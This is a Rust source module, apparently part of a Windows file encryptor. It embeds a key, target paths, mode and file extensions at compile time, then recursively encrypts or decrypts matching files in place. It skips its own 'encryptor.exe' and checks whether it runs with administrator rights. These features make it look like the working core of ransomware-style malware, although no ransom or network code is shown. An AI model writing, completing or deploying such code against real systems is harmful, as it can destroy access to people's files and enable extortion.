use std::io::Write;
use std::path::Path;
use colored::Colorize;
use rypes::errors::errors::RError;
use walkdir::WalkDir;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use crate::decrypt::decrypt_file_in_place;
use crate::encrypt::encrypt_file_in_place;
use crate::models::{IGNORE_EXTENSIONS, TARGET_EXTENSIONS};

pub fn get_embedded_config() -> Result<(String, Vec<String>, String, Vec<String>,), RError> {
	let key : &'static str                      = env!("ENCRYPTION_KEY")        ;
	let paths_str : &'static str                = env!("TARGET_PATHS")          ;
	let mode : &'static str                     = env!("OPERATION_MODE")        ;
	let allowed_extensions_str : &'static str   = env!("ALLOWED_EXTENSIONS")    ;

	let paths: Vec<String> = paths_str.to_string().split('|').map(|s : &str| s.to_string()).collect();
	let allowed_extensions: Vec<String> = allowed_extensions_str.to_string().split('|').map(|s : &str| s.to_string()).collect();

	Ok((key.to_string(), paths, mode.to_string(), allowed_extensions))
}

pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, allowed_extensions: Vec<String>) -> Result<(usize, usize), String> {
	let path = Path::new(path_str);

	if !path.exists() { return Err(format!("Path does not exist: {}", path_str)); }

	let mut processed = 0;
	let mut errors = 0;
	let mut skipped = 0;

	if path.is_file() {
		if mode == "encrypt" && !should_encrypt_file(path, allowed_extensions.clone()) {
			println!("   ⏭️  Skipped: {} (ignored extension)", path.display());
			return Ok((0, 0));
		}

		let result = if mode == "encrypt" { encrypt_file_in_place(path, key) } else { decrypt_file_in_place(path, key) };

		match result {
			Ok(_) => processed = 1,
			Err(e) => { errors = 1;println!("{}", e.red()); }
		}
	} else if path.is_dir() {
		println!("   Scanning directory...");
		for entry in WalkDir::new(path).follow_links(false).into_iter().filter_map(|e| e.ok()) {
			let entry_path = entry.path();
			if !entry_path.is_file() { continue; }

			if let Some(name) = entry_path.file_name() {
				if name == "encryptor.exe" { continue; }
			}

			if mode == "encrypt" {
				if !should_encrypt_file(entry_path, allowed_extensions.clone()) {
					skipped += 1;
					continue;
				}
			}

			let result = if mode == "encrypt" { encrypt_file_in_place(entry_path, key) } else { decrypt_file_in_place(entry_path, key) };

			match result {
				Ok(_) => { processed += 1;print!(".");std::io::stdout().flush().unwrap(); }
				Err(e) => { errors += 1;println!("\n{}", e.red()); }
			}
		}
		println!();
		if skipped > 0 { println!("   ⏭️  Skipped {} files (ignored extensions)", skipped); }
	}

	Ok((processed, errors))
}

fn should_encrypt_file(path: &Path, allowed_extension: Vec<String>) -> bool {
	let extension = path.extension().and_then(|ext| ext.to_str()).map(|ext| ext.to_lowercase());

	match extension {
		Some(ext) => {
			allowed_extension.contains(&ext.to_string())
		}
		_ => {
			false
		}
	}
}

pub fn is_admin() -> bool {
	unsafe {
		let mut token = HANDLE::default();
		if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() { return false; }

		let mut elevation = TOKEN_ELEVATION::default();
		let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;

		let result = GetTokenInformation(token, TokenElevation, Some(&mut elevation as *mut _ as *mut _), size, &mut size, );

		let is_elevated = result.is_ok() && elevation.TokenIsElevated != 0;
		let _ = CloseHandle(token);
		is_elevated
	}
}